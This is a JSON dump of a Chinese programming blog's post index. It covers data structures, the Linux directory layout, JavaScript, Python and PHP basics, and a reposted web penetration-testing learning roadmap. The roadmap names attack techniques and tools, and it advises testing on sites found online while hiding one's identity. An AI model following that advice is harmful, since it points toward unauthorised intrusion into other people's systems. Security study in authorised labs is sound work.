在程序中，经常需要将一组（通常是同为某个类型的）数据元素作为整体管理和使用，需要创建这种元素组，用变量记录它们，传进传出函数等。一组数据中包含的元素个数可能发生变化（可以增加或删除元素）。对于这种需求，最简单的解决方案便是将这样一组元素看成一个序列，用元素在序列里的位置和顺序，表示实际应用中的某种有意义的信息，或者表示数据之间的某种关系。这样的一组序列元素的组织形式，我们可以将其抽象为线性表。一个线性表是某类元素的一个集合，还记录着元素之间的一种顺序关系。线性表是最基本的数据结构之一，在实际程序中应用非常广泛，它还经常被用作更复杂的数据结构的实现基础。根据线性表的实际存储方式， 分为两种实现模型： 顺序表，将元素顺序地存放在一块连续的存储区里，元素间的顺序关系由它们的存储顺序自然表示。 链表，将元素存放在通过链接构造起来的一系列存储块中。 顺序表的基本形式 图a表示的是顺序表的基本形式，数据元素本身连续存储，每个元素所占的存储单元大小固定相同，元素的下标是其逻辑地址，而元素存储的物理地址（实际内存地址）可以通过存储区的起始地址Loc (e0)加上逻辑地址（第i个元素）与存储单元大小（c）的乘积计算而得，即： Loc(ei) = Loc(e0) + c*i 故，访问指定元素时无需从头遍历，通过计算便可获得对应地址，其时间复杂度为O(1)。 如果元素的大小不统一，则须采用图b的元素外置的形式，将实际数据元素另行存储，而顺序表中各单元位置保存对应元素的地址信息（即链接）。由于每个链接所需的存储量相同，通过上述公式，可以计算出元素链接的存储位置，而后顺着链接找到实际存储的数据元素。注意，图b中的c不再是数据元素的大小，而是存储一个链接地址所需的存储量，这个量通常很小。 图b这样的顺序表也被称为对实际数据的索引，这是最简单的索引结构。 顺序表的结构与实现 一个顺序表的完整信息包括两部分，一部分是表中的元素集合，另一部分是为实现正确操作而需记录的信息，即有关表的整体情况的信息，这部分信息主要包括元素存储区的容量和当前表中已有的元素个数两项。 顺序表的两种基本实现方式 图a为一体式结构，存储表信息的单元与元素存储区以连续的方式安排在一块存储区里，两部分数据的整体形成一个完整的顺序表对象;一体式结构整体性强，易于管理。但是由于数据元素存储区域是表对象的一部分，顺序表创建后，元素存储区就固定了;图b为分离式结构，表对象里只保存与整个表有关的信息（即容量和元素个数），实际数据元素存放在另一个独立的元素存储区里，通过链接与基本表对象关联。 元素存储区替换 一体式结构由于顺序表信息区与数据区连续存储在一起，所以若想更换数据区，则只能整体搬迁，即整个顺序表对象（指存储顺序表的结构信息的区域）改变了。 分离式结构若想更换数据区，只需将表信息区中的数据区链接地址更新即可，而该顺序表对象不变。 元素存储区扩充 采用分离式结构的顺序表，若将数据区更换为存储空间更大的区域，则可以在不改变表对象的前提下对其数据存储区进行了扩充，所有使用这个表的地方都不必修改。只要程序的运行环境（计算机系统）还有空闲存储，这种表结构就不会因为满了而导致操作无法进行。人们把采用这种技术实现的顺序表称为动态顺序表，因为其容量可以在使用中动态变化。 扩充的两种策略 每次扩充增加固定数目的存储位置，如每次扩充增加10个元素位置，这种策略可称为线性增长。 特点：节省空间，但是扩充操作频繁，操作次数多。 每次扩充容量加倍，如每次扩充增加一倍存储空间。 特点：减少了扩充操作的执行次数，但可能会浪费空间资源。以空间换时间，推荐的方式。 顺序表的操作 增加元素 如图所示，为顺序表增加新元素111的三种方式 a. 尾端加入元素，时间复杂度为O(1) b. 非保序的加入元素（不常见），时间复杂度为O(1) c. 保序的元素加入，时间复杂度为O(n) 删除元素 Python中的顺序表 Python中的list和tuple两种类型采用了顺序表的实现技术，具有前面讨论的顺序表的所有性质。 tuple是不可变类型，即不变的顺序表，因此不支持改变其内部状态的任何操作，而其他方面，则与list的性质类似。 list的基本实现技术 Python标准类型list就是一种元素个数可变的线性表，可以加入和删除元素，并在各种操作中维持已有元素的顺序（即保序），而且还具有以下行为特征： 基于下标（位置）的高效元素访问和更新，时间复杂度应该是O(1)； 为满足该特征，应该采用顺序表技术，表中元素保存在一块连续的存储区中。 允许任意加入元素，而且在不断加入元素的过程中，表对象的标识（函数id得到的值）不变。 为满足该特征，就必须能更换元素存储区，并且为保证更换存储区时list对象的标识id不变，只能采用分离式实现技术。 在Python的官方实现中，list就是一种采用分离式技术实现的动态顺序表。这就是为什么用list.append(x) （或 list.insert(len(list), x)，即尾部插入）比在指定位置插入元素效率高的原因。 在Python的官方实现中，list实现采用了如下的策略：在建立空表（或者很小的表）时，系统分配一块能容纳8个元素的存储区；在执行插入操作（insert或append）时，如果元素存储区满就换一块4倍大的存储区。但如果此时的表已经很大（目前的阀值为50000），则改变策略，采用加一倍的方法。引入这种改变策略的方式，是为了避免出现过多空闲的存储位置。","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://xiaowuyoucy.github.io/categories/数据结构与算法/"}],"tags":[{"name":"顺序表","slug":"顺序表","permalink":"https://xiaowuyoucy.github.io/tags/顺序表/"}]},{"title":"Linux目录结构","slug":"201604150110","date":"2016-04-14T17:11:18.000Z","updated":"2019-04-14T18:02:10.469Z","comments":true,"path":"2016/04/15/201604150110/","link":"","permalink":"https://xiaowuyoucy.github.io/2016/04/15/201604150110/","excerpt":"","text":"linux 的文件系统是采用层级式的树状目录结构，在此结构中的最上一层是根目录“/” 然后在此目录下再创建其他的目录。 深刻理解Linux树状文件目录是非常重要的，linux有一句非常经典的话叫做:在linux世界里，一切皆文件。 以下是对这些目录的解释： /bin： bin是Binary的缩写, 这个目录存放着最经常使用的命令。 /boot： 这里存放的是启动Linux时使用的一些核心文件，包括一些连接文件以及镜像文件。 /dev ： dev是Device(设备)的缩写, 该目录下存放的是Linux的外部设备，在Linux中访问设备的方式和访问文件的方式是相同的。 /dev ： dev是Device(设备)的缩写, 该目录下存放的是Linux的外部设备，在Linux中访问设备的方式和访问文件的方式是相同的。 /etc： 这个目录用来存放所有的系统管理所需要的配置文件和子目录。 /home： 用户的主目录，在Linux中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的。 /lib： 这个目录里存放着系统最基本的动态连接共享库，其作用类似于Windows里的DLL文件。几乎所有的应用程序都需要用到这些共享库。 /lost+found： 这个目录一般情况下是空的，当系统非法关机后，这里就存放了一些文件。 /media： linux系统会自动识别一些设备，例如U盘、光驱等等，当识别后，linux会把识别的设备挂载到这个目录下。 /mnt： 系统提供该目录是为了让用户临时挂载别的文件系统的，我们可以将光驱挂载在/mnt/上，然后进入该目录就可以查看光驱里的内容了。 /opt： 这是给主机额外安装软件所摆放的目录。比如你安装一个ORACLE数据库则就可以放到这个目录下。默认是空的。 /proc： 这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。 这个目录的内容不在硬盘上而是在内存里，我们也可以直接修改里面的某些文件，比如可以通过下面的命令来屏蔽主机的ping命令，使别人无法ping你的机器： 1echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all /root： 该目录为系统管理员，也称作超级权限者的用户主目录。 /sbin： s就是Super User的意思，这里存放的是系统管理员使用的系统管理程序。 /selinux： 这个目录是Redhat/CentOS所特有的目录，Selinux是一个安全机制，类似于windows的防火墙，但是这套机制比较复杂，这个目录就是存放selinux相关的文件的。 /srv： 该目录存放一些服务启动之后需要提取的数据。 这是linux2.6内核的一个很大的变化。该目录下安装了2.6内核中新出现的一个文件系统 sysfs 。 sysfs文件系统集成了下面3种文件系统的信息：针对进程信息的proc文件系统、针对设备的devfs文件系统以及针对伪终端的devpts文件系统，该文件系统是内核设备树的一个直观反映。当一个内核对象被创建的时候，对应的文件和目录也在内核对象子系统中被创建。 /tmp： 这个目录是用来存放一些临时文件的。 /usr： 这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似于windows下的program files目录。 /usr/bin： 系统用户使用的应用程序。 /usr/sbin： 超级用户使用的比较高级的管理程序和系统守护程序。 /usr/src： 内核源代码默认的放置目录。 /var： 这个目录中存放着在不断扩充着的东西，我们习惯将那些经常被修改的目录放在这个目录下。包括各种日志文件。 /run： 是一个临时文件系统，存储系统启动以来的信息。当系统重启时，这个目录下的文件应该被删掉或清除。如果你的系统上有 /var/run 目录，应该让它指向 run。 在 Linux 系统中，有几个目录是比较重要的，平时需要注意不要误删除或者随意更改内部文件。 /etc： 上边也提到了，这个是系统中的配置文件，如果你更改了该目录下的某个文件可能会导致系统不能启动。 /bin, /sbin, /usr/bin, /usr/sbin: 这是系统预设的执行文件的放置目录，比如 ls 就是在/bin/ls 目录下的。 值得提出的是，/bin, /usr/bin 是给系统用户使用的指令（除root外的通用户），而/sbin, /usr/sbin 则是给root使用的指令。 /var： 这是一个非常重要的目录，系统上跑了很多程序，那么每个程序都会有相应的日志产生，而这些日志就被记录到这个目录下，具体在/var/log 目录下，另外mail的预设放置也是在这里。","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[{"name":"linux目录结构","slug":"linux目录结构","permalink":"https://xiaowuyoucy.github.io/tags/linux目录结构/"}]},{"title":"js-this方法","slug":"201504091559","date":"2015-04-09T07:59:18.000Z","updated":"2019-04-09T08:00:20.819Z","comments":true,"path":"2015/04/09/201504091559/","link":"","permalink":"https://xiaowuyoucy.github.io/2015/04/09/201504091559/","excerpt":"","text":"1234567891011121314151617181920212223242526272829303132333435363738394041&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script&gt; // this出现在以下位置，分别代表什么 // 1 函数中 -- this 指向Window // 2 在方法中 -- this 指向的是这个方法所属的对象 // 3 构造函数中 -- this 就是构造函数创建的对象 // 函数 // function fn() &#123; // console.log(this); // &#125; // fn(); // 对象 // var obj = &#123; // name: 'zs', // fn: function () &#123; // console.log(this.name); // &#125; // &#125;; // obj.fn(); // 构造函数 function Fn() &#123; this.name = 'zs'; this.age = 18; console.log(this); &#125; // var o = new Fn(); // 调用构造函数 Fn(); // 函数调用 &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://xiaowuyoucy.github.io/categories/编程开发/"}],"tags":[{"name":"js-this方法","slug":"js-this方法","permalink":"https://xiaowuyoucy.github.io/tags/js-this方法/"}]},{"title":"javascript函数","slug":"201504072316","date":"2015-04-07T15:16:20.000Z","updated":"2019-04-07T17:25:25.508Z","comments":true,"path":"2015/04/07/201504072316/","link":"","permalink":"https://xiaowuyoucy.github.io/2015/04/07/201504072316/","excerpt":"","text":"什么是函数 把一段相对独立的具有特定功能的代码块封装起来，形成一个独立实体，就是函数，起个名字（函数名，在后续开发中可以反复调用,函数的作用就是封装一段代码，将来可以重复使用。 函数的定义 函数声明 123function 函数名() &#123; // 函数体&#125; 函数表达式 123var fn = function () &#123; // 函数体&#125; 特定：函数声明的时候，函数体并不会执行，只要当函数被调用的时候才会执行。 函数一般都用来干一件事情，函数名称一般使用动词。 调用函数的语法 函数名(); 特点：函数体只有在调用的时候才会执行，调用需要()进行调用。可以调用多次(重复使用) 代码示例： 1234567891011121314151617// 声明函数function sayHi() &#123; console.log(\"吃了没？\");&#125;// 调用函数sayHi();// 求1-100之间所有数的和function getSum() &#123; var sum = 0; for (var i = 0; i &lt; 100; i++) &#123; sum += i; &#125; console.log(sum);&#125;// 调用getSum(); 函数的参数 为什么要有参数 12345678910function getSum() &#123; var sum = 0; for (var i = 1; i &lt;= 100; i++) &#123; sum += i; &#125; console.log();&#125;// 虽然上面代码可以重复调用，但是只能计算1-100之间的值// 如果想要计算n-m之间所有数的和，应该怎么办呢？ 语法 12345678910// 函数内部是一个封闭的环境，可以通过参数的方式，把外部的值传递给函数内部// 带参数的函数声明function 函数名(形参1, 形参2, 形参3...) &#123; // 函数体&#125;// 带参数的函数调用函数名(实参1, 实参2, 实参3); 形参1 = 实参1形参2 = 实参2 形参和实参 形式参数：在声明一个函数的时候，为了函数的功能更加灵活，有些值是固定不了的，对于这些固定不了的值。我们可以给函数设置参数。这个参数没有具体的值，仅仅起到一个占位置的作用，我们通常称之为形式参数，也叫形参。 实际参数：如果函数在声明时，设置了形参，那么在函数调用的时候就需要传入对应的参数，我们把传入的参数叫做实际参数，也叫实参。 123456var x = 5, y = 6;fn(x,y); function fn(a, b) &#123; console.log(a + b);&#125;// x,y实参，有具体的值。函数执行的时候会把x,y复制一份给函数内部的a和b，函数内部的值是复制的新值，无法修改外部的x,y 函数返回值 当函数执行完的时候，并不是所有时候都要把结果打印。我们期望函数给我一些反馈（比如计算的结果返回进行后续的运算），这个时候可以让函数返回一些东西。也就是返回值。函数通过return返回一个返回值 返回值语法： 12345678//声明一个带返回值的函数function 函数名(形参1, 形参2, 形参3...) &#123; //函数体 return 返回值;&#125;//可以通过变量来接收这个返回值var 变量 = 函数名(实参1, 实参2, 实参3...);","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://xiaowuyoucy.github.io/categories/编程开发/"}],"tags":[{"name":"javascript函数","slug":"javascript函数","permalink":"https://xiaowuyoucy.github.io/tags/javascript函数/"}]},{"title":"while和dowhile循环","slug":"201504051853","date":"2015-04-04T20:13:18.000Z","updated":"2019-04-05T11:35:51.671Z","comments":true,"path":"2015/04/05/201504051853/","link":"","permalink":"https://xiaowuyoucy.github.io/2015/04/05/201504051853/","excerpt":"","text":"while与 do while 的区别： while：先判断再执行。 do…while：先执行再判断。（无论如何会执行一次循环体里面的代码，二while循环有可能一次都不会执行） 12345678910111213141516171819202122232425262728293031323334353637383940&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;script&gt; // 案例一：小盒子身上有100元，用while输出能吃多少次米线，一碗米线12元，最终还剩下多少钱。 var money = 100; while(money &gt;= 12)&#123; money -=12; console.log('我吃了一碗米线,还剩'+money+'元') &#125; //案例二：小盒子身上没钱了，吃了个霸王餐，用do...while实现。 do&#123; var money = 5; console.log(\"小盒子正在吃米线\"); money-=12 &#125;while(money&gt;=12) console.log(\"小盒子身上没钱了，吃了个霸王餐\");// 使用do-while循环：输出询问“我爱你，嫁给我吧？”，选择“你喜欢我吗？(y/n):\"，如果输入为y则打印”我们形影不离“，若输入为n,则继续询问 do &#123; var msg = prompt('你到底爱不爱我？', '请输入yes/no'); &#125; while (msg !== 'yes'); console.log('亲亲我的宝贝'); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://xiaowuyoucy.github.io/categories/编程开发/"}],"tags":[{"name":"dowhile循环","slug":"dowhile循环","permalink":"https://xiaowuyoucy.github.io/tags/dowhile循环/"}]},{"title":"js布尔类型的隐私转换","slug":"201804051318","date":"2015-04-04T20:13:18.000Z","updated":"2019-04-08T03:27:01.009Z","comments":true,"path":"2015/04/05/201804051318/","link":"","permalink":"https://xiaowuyoucy.github.io/2015/04/05/201804051318/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script&gt; // var num = 0; // console.log(Boolean(num)); // 转换成false的情况 0 ''空字符串 NaN null undefined // 隐式类型转换 // if (num) &#123; // console.log('hello'); // &#125; // // // var msg; // if (msg) &#123; // console.log('hello'); // &#125; // // var str = '123'; var isOK = !!str; // Boolean(str); console.log(isOK); &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://xiaowuyoucy.github.io/categories/编程开发/"}],"tags":[{"name":"js布尔类型隐私转换","slug":"js布尔类型隐私转换","permalink":"https://xiaowuyoucy.github.io/tags/js布尔类型隐私转换/"}]},{"title":"Python内置方法的时间复杂度测试分析","slug":"20150410224","date":"2015-03-30T20:13:18.000Z","updated":"2019-04-14T18:22:26.522Z","comments":true,"path":"2015/03/31/20150410224/","link":"","permalink":"https://xiaowuyoucy.github.io/2015/03/31/20150410224/","excerpt":"","text":"timeit模块 timeit模块可以用来测试一小段Python代码的执行速度。 class timeit.Timer(stmt=‘pass’, setup=‘pass’, timer=) Timer是测量小段代码执行速度的类。 stmt参数是要测试的代码语句（statment）； setup参数是运行代码时需要的设置； timer参数是一个定时器函数，与平台有关。 timeit.Timer.timeit(number=1000000) Timer类中测试语句执行速度的对象方法。number参数是测试代码时的测试次数，默认为1000000次。方法返回执行代码的平均耗时，一个float类型的秒数。 list的操作测试 12345678910111213141516171819202122232425262728def test1(): l = [] for i in range(1000): l = l + [i]def test2(): l = [] for i in range(1000): l.append(i)def test3(): l = [i for i in range(1000)]def test4(): l = list(range(1000))from timeit import Timert1 = Timer(\"test1()\", \"from __main__ import test1\")print(\"concat \",t1.timeit(number=1000), \"seconds\")t2 = Timer(\"test2()\", \"from __main__ import test2\")print(\"append \",t2.timeit(number=1000), \"seconds\")t3 = Timer(\"test3()\", \"from __main__ import test3\")print(\"comprehension \",t3.timeit(number=1000), \"seconds\")t4 = Timer(\"test4()\", \"from __main__ import test4\")print(\"list range \",t4.timeit(number=1000), \"seconds\")# ('concat ', 1.7890608310699463, 'seconds')# ('append ', 0.13796091079711914, 'seconds')# ('comprehension ', 0.05671119689941406, 'seconds')# ('list range ', 0.014147043228149414, 'seconds') pop操作测试 123456789x = range(2000000)pop_zero = Timer(\"x.pop(0)\",\"from __main__ import x\")print(\"pop_zero \",pop_zero.timeit(number=1000), \"seconds\")x = range(2000000)pop_end = Timer(\"x.pop()\",\"from __main__ import x\")print(\"pop_end \",pop_end.timeit(number=1000), \"seconds\")# ('pop_zero ', 1.9101738929748535, 'seconds')# ('pop_end ', 0.00023603439331054688, 'seconds') 测试pop操作：从结果可以看出，pop最后一个元素的效率远远高于pop第一个元素 可以自行尝试下list的append(value)和insert(0,value),即一个后面插入和一个前面插入？？？ list内置操作的时间复杂度 dict内置操作的时间复杂度","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://xiaowuyoucy.github.io/categories/数据结构与算法/"}],"tags":[{"name":"时间复杂度测试","slug":"时间复杂度测试","permalink":"https://xiaowuyoucy.github.io/tags/时间复杂度测试/"}]},{"title":"WEB安全渗透学习指南","slug":"201502092357","date":"2015-03-09T13:33:18.000Z","updated":"2019-04-23T15:15:27.231Z","comments":true,"path":"2015/03/09/201502092357/","link":"","permalink":"https://xiaowuyoucy.github.io/2015/03/09/201502092357/","excerpt":"","text":"学习规划： 作者：向生李 链接：http://www.zhihu.com/question/21914899/answer/39344435 来源：知乎 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 Web安全相关概念 熟悉基本概念（SQL注入、上传、XSS、CSRF、一句话木马等）。 通过关键字（SQL注入、上传、XSS、CSRF、一句话木马等）进行Google/SecWiki； 阅读《精通脚本黑客》，虽然很旧也有错误，但是入门还是可以的； 看一些渗透笔记/视频，了解渗透实战的整个过程，可以Google（渗透笔记、渗透过程、入侵过程等）； 3周 熟悉渗透相关工具 熟悉AWVS、sqlmap、Burp、nessus、chopper、nmap、Appscan等相关工具的使用。 了解该类工具的用途和使用场景，先用软件名字Google/SecWiki； 下载无后们版的这些软件进行安装； 学习并进行使用，具体教材可以在SecWiki上搜索，例如：Brup的教程、sqlmap； 待常用的这几个软件都学会了可以安装音速启动做一个渗透工具箱； 5周 渗透实战操作掌握渗透的整个阶段并能够独立渗透小型站点。 网上找渗透视频看并思考其中的思路和原理，关键字（渗透、SQL注入视频、文件上传入侵、数据库备份、dedecms漏洞利用等等）； 自己找站点/搭建测试环境进行测试，记住请隐藏好你自己； 思考渗透主要分为几个阶段，每个阶段需要做那些工作，例如这个：PTES渗透测试执行标准； 研究SQL注入的种类、注入原理、手动注入技巧； 研究文件上传的原理，如何进行截断、双重后缀欺骗(IIS、PHP)、解析漏洞利用（IIS、Nignix、Apache）等，参照：上传攻击框架； 研究XSS形成的原理和种类，具体学习方法可以Google/SecWiki，可以参考：XSS； 研究Windows/Linux提权的方法和具体使用， 可以参考：提权； 可以参考: 开源渗透测试脆弱系统； 1周 关注安全圈动态 关注安全圈的最新漏洞、安全事件与技术文章。 通过SecWiki浏览每日的安全技术文章/事件； 通过Weibo/twitter关注安全圈的从业人员（遇到大牛的关注或者好友果断关注），天天抽时间刷一下； 通过feedly/鲜果订阅国内外安全技术博客（不要仅限于国内，平时多注意积累），没有订阅源的可以看一下SecWiki的聚合栏目； 养成习惯，每天主动提交安全技术文章链接到SecWiki进行积淀； 多关注下最新漏洞列表，推荐几个：exploit-db、CVE中文库、Wooyun等，遇到公开的漏洞都去实践下。 关注国内国际上的安全会议的议题或者录像，推荐SecWiki-Conference。 3周 熟悉Windows/Kali Linux 学习Windows/Kali Linux基本命令、常用工具； 熟悉Windows下的常用的cmd命令，例如：ipconfig,nslookup,tracert,net,tasklist,taskkill等； 熟悉Linux下的常用命令，例如：ifconfig,ls,cp,mv,vi,wget,service,sudo等； 熟悉Kali Linux系统下的常用工具，可以参考SecWiki,《Web Penetration Testing with Kali Linux》、《Hacking with Kali》等； 熟悉metasploit工具，可以参考SecWiki、《Metasploit渗透测试指南》。 3周 服务器安全配置 学习服务器环境配置，并能通过思考发现配置存在的安全问题。 Windows2003/2008环境下的IIS配置，特别注意配置安全和运行权限，可以参考：SecWiki-配置； Linux环境下的LAMP的安全配置，主要考虑运行权限、跨目录、文件夹权限等，可以参考：SecWiki-配置； 远程系统加固，限制用户名和口令登陆，通过iptables限制端口； 配置软件Waf加强系统安全，在服务器配置mod_security等系统，参见SecWiki-ModSecurity； 通过Nessus软件对配置环境进行安全检测，发现未知安全威胁。 4周 脚本编程学习 选择脚本语言Perl/Python/PHP/Go/Java中的一种，对常用库进行编程学习。 搭建开发环境和选择IDE，PHP环境推荐Wamp和XAMPP，IDE强烈推荐Sublime，一些Sublime的技巧：SecWiki-Sublime； Python编程学习，学习内容包含：语法、正则、文件、网络、多线程等常用库，推荐《Python核心编程》，不要看完； 用Python编写漏洞的exp，然后写一个简单的网络爬虫，可参见SecWiki-爬虫、视频； PHP基本语法学习并书写一个简单的博客系统，参见《PHP与MySQL程序设计（第4版）》、视频； 熟悉MVC架构，并试着学习一个PHP框架或者Python框架（可选）； 了解Bootstrap的布局或者CSS，可以参考：SecWiki-Bootstrap; 3周 源码审计与漏洞分析 能独立分析脚本源码程序并发现安全问题。 熟悉源码审计的动态和静态方法，并知道如何去分析程序，参见SecWiki-审计； 从Wooyun上寻找开源程序的漏洞进行分析并试着自己分析； 了解Web漏洞的形成原因，然后通过关键字进行查找分析，参见SecWiki-代码审计、高级PHP应用程序漏洞审核技术； 研究Web漏洞形成原理和如何从源码层面避免该类漏洞，并整理成checklist。 5周 安全体系设计与开发 能建立自己的安全体系，并能提出一些安全建议或者系统架构。 开发一些实用的安全小工具并开源，体现个人实力； 建立自己的安全体系，对公司安全有自己的一些认识和见解； 提出或者加入大型安全系统的架构或者开发；","categories":[{"name":"WEB安全渗透","slug":"WEB安全渗透","permalink":"https://xiaowuyoucy.github.io/categories/WEB安全渗透/"}],"tags":[{"name":"web安全渗透","slug":"web安全渗透","permalink":"https://xiaowuyoucy.github.io/tags/web安全渗透/"}]},{"title":"PHP变量的4个基本操作","slug":"201409240457","date":"2014-09-23T21:00:00.000Z","updated":"2019-09-24T17:59:22.040Z","comments":true,"path":"2014/09/24/201409240457/","link":"","permalink":"https://xiaowuyoucy.github.io/2014/09/24/201409240457/","excerpt":"","text":"1 赋值操作 123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;?php $name = \"PHP是世界上最好的语言\"; # 将数值1放入到变量（V1）中 #变量初始赋值后，可以后续再去重新赋值——这就是修改了变量的值，比如： #$name = “PHP不是世界上最好的语言”; ?&gt;&lt;/body&gt;&lt;/html&gt; 变量赋值的本质是：将变量名，跟一个数据“建立关联（联系） 2 取值操作 取值，就是，从变量这个容器中拿到其中存储的数据（值）； 取值无处不在：凡是使用到变量，并在该位置上，需要一个“数据”的时候，就会发生取值操作 3 判断变量isset() 就是判断一个“变量名”是否里面存储了数据！ 判断的结果是：true（真，表示有），或者false（假，表示没有）。 使用这个语法来判断：isset( $变量名 ); 还有一个特殊的赋值，赋值后，变量中也没有数据，如下： $v5 = null; //null是一个特殊的“数据”（值），该数据的含义是：没有数据。 即此时判断 isset($v5)的结果是“false”。 4 删除/销毁变量unset() 123456789101112131415161718&lt;?php $v1 = 1;$result = isset($v1); //将对变量v1的判断结果放到$result中echo $result; //实际结果是“true”，但echo输出后为“1”echo \"&lt;br&gt;\";var_dump($result); //这也是输出！ //var_dump()可以输出一个变量的完整信息$result2 = isset($v3);echo \"&lt;br&gt;v3的结果为：\";var_dump($result2);//下面演示unset掉一个变量后的结果：unset($v1); //销毁该变量！$result3 = isset($v1);echo \"&lt;br&gt;v1被unset()之后为：\";var_dump($result3);echo $v1; ?&gt; 当一个变量中存储了数据，我们也可以去销毁（删除）它，语法如下： unset( $变量名 ）。 删除变量的本质是：断开变量名跟其关联过的那个数据之间的“联系”，图示如下： 此时，该变量就不再指向某个数据了，其isset()判断的结果为false。","categories":[{"name":"PHP","slug":"PHP","permalink":"https://xiaowuyoucy.github.io/categories/PHP/"}],"tags":[{"name":"php变量","slug":"php变量","permalink":"https://xiaowuyoucy.github.io/tags/php变量/"},{"name":"变量的操作","slug":"变量的操作","permalink":"https://xiaowuyoucy.github.io/tags/变量的操作/"}]},{"title":"PHP中的4个预定义变量","slug":"201409240602","date":"2014-09-23T21:00:00.000Z","updated":"2019-09-24T13:45:36.071Z","comments":true,"path":"2014/09/24/201409240602/","link":"","permalink":"https://xiaowuyoucy.github.io/2014/09/24/201409240602/","excerpt":"","text":"$_GET 代表浏览器表单通过“get”方式提交的所有数据（集），可以称为“get数据”。 也可以理解为： $_GET变量里面会“自动存储”（保存/装载）提交到某个文件中的GET数据。 而GET数据，是在一个页面以“get”方式请求的时候提交的数据。 代码演示： 制作一个表单，有两个输入框，可以输出数字，并提交。 到另一个页面（文件）中，计算这两个数字的和！ 对该加法计算的一个改进： $_POST 代表浏览器表单通过“post”方式提交的所有数据（集），可以称为“POST数据”。 也可以理解为： $_POST变量里面会“自动存储”（保存/装载）提交到某个文件中的POST数据。 而POST数据，是在一个表单中以“post”方式提交的数据。 代码演示： 有个表单，两个输入框，可以填写数字，有一个“提交按钮”，点击提交，可以计算他们的和并输出。 扩展（提交给自己！）： $_REQUEST 代表浏览器通过“get”方式 或 “post”方式提交的数据的合集。 即：它既能接收到get过来的数据，也能接收到post过来的数据！ 通常，一个表单，只提交一种形式的数据，要么get数据，要么post数据！ 代码演示： 但，有一个情况，提交post数据的同时，也可以提交get数据： $_SERVER 它代表任何一次请求中，客户端或服务器端的一些“基本信息”或系统信息，包括很多（10多项）。 我们无非就是要知道，哪些信息是可以供我们使用的！ 常用的有： PHP_SELF： 表示当前请求的网页地址（不含域名部分） SERVER_NAME： 表示当前请求的服务器名 SERVER_ADDR： 表示当前请求的服务器IP地址 DOCUMENT_ROOT： 表示当前请求的网站物理路径（apache设置站点时那个） REMOTE_ADDR： 表示当前请求的客户端的IP地址 SCRIPT_NAME： 表示当前网页地址 代码演示：","categories":[{"name":"PHP","slug":"PHP","permalink":"https://xiaowuyoucy.github.io/categories/PHP/"}],"tags":[{"name":"$_GET","slug":"GET","permalink":"https://xiaowuyoucy.github.io/tags/GET/"},{"name":"$_POST，$_SERVER","slug":"POST，-SERVER","permalink":"https://xiaowuyoucy.github.io/tags/POST，-SERVER/"},{"name":"$_REQUEST","slug":"REQUEST","permalink":"https://xiaowuyoucy.github.io/tags/REQUEST/"}]},{"title":"PHP常量","slug":"201409242200","date":"2014-09-23T21:00:00.000Z","updated":"2019-09-24T15:59:31.901Z","comments":true,"path":"2014/09/24/201409242200/","link":"","permalink":"https://xiaowuyoucy.github.io/2014/09/24/201409242200/","excerpt":"","text":"define()函数形式： define(‘常量名’, 对应的常量值); 常量名推荐使用“全大写”。 const关键字定义： const 常量名 = 对应的常量值; 演示： 常量的两种取值形式 直接使用： echo 常量名； //注意：使用常量，前面不带”$”符号，也不能有引号 使用constant()函数以取值： echo constant(‘常量名’); //注意，此时常量名要用引号引起来。 变量与常量的区别： 1，变量的数据可以变化（重新赋值），常量不可以。 2，变量可以存储各种数据类型，而常量只能存储简单数据类型。 3，给变量赋值可以是“计算”结果，但给常量赋值，只能是“直接写出的值”（字面值） 判断一个常量是否存在：defined(); 判断的结果返回：true（表示存在）或false（表示不存在） 形式： if（ defined (‘常量名’) ) { //如果该常量名存在，则… //…做什么事情。。。。 } 演示：","categories":[{"name":"PHP","slug":"PHP","permalink":"https://xiaowuyoucy.github.io/categories/PHP/"}],"tags":[{"name":"PHP常量","slug":"PHP常量","permalink":"https://xiaowuyoucy.github.io/tags/PHP常量/"},{"name":"PHP两种定义常量的形式","slug":"PHP两种定义常量的形式","permalink":"https://xiaowuyoucy.github.io/tags/PHP两种定义常量的形式/"}]},{"title":"PHP中的3个魔术常量","slug":"201909250033","date":"2014-09-23T16:33:00.000Z","updated":"2019-09-24T16:37:00.239Z","comments":true,"path":"2014/09/24/201909250033/","link":"","permalink":"https://xiaowuyoucy.github.io/2014/09/24/201909250033/","excerpt":"","text":"含义： 魔术常量也是常量，只是在形式上为常量，而其值其实是“变化”的。 他们也是系统中预先定义好的，也就几个，下面是最常用的 3个： DIR ：代表当前php网页文件所在的目录 FILE ：代表当前php网页文件本身的路径 LINE, 